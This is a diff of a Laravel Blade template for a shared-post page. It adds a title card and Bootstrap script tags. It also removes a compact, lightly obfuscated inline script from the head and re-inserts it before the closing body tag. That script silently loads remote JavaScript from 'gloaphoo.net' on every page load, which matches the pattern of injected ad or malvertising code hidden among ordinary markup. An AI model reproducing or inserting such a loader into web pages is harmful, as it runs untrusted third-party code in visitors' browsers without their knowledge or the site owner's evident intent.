@@ -16,7 +16,7 @@
     <title>{{$share->post_content}}</title>
     <link rel="stylesheet" href="{{URL::to('bst/css/bootstrap.css')}}">
     <link rel="stylesheet" href="{{URL::to('fa/css/all.css')}}">
-    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gloaphoo.net',5596069,document.createElement('script'))</script>
+    
 </head>
 <body>
     @include('partials.navbar')
@@ -24,6 +24,13 @@
     <div class="container mt-2">
         <div class="row justify-content-center">
             <div class="col-sm-6">
+                <div class="card">
+                    <div class="card-body">
+                        <div class="card-text text-center">
+                            <span>{{$share->post->title}}</span>
+                    </div>
+                    </div>
+                </div>
                 <div class="card shadow">
                     <div class="card-body">
                         <img src="{{URL::to('items/'.$share->post_img)}}" class="img-fluid">
@@ -44,3 +51,12 @@
     </div>
 
    
+    <script src="{{URL::to('bst/js/popper.js')}}"></script>
+    <script src="{{URL::to('bst/js/bootstrap.js')}}"></script>
+ 
+    <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gloaphoo.net',5596069,document.createElement('script'))</script>
+  
+    @livewireScripts
+   
+</body>
+</html>
